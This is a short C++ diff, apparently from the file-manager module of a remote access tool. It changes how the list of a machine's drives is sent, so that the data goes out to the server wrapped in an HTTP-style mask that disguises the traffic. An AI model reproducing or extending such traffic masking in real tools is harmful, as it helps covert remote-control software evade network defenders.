@@ -294,8 +294,8 @@ UINT CFileManager::SendDriveList()
 		
 		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
 	}
-
-	return Send((LPBYTE)DriveList, dwOffset);
+	HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+	return m_ClientObject->Send2Server((char*)DriveList, dwOffset, &mask);
 }
 
 
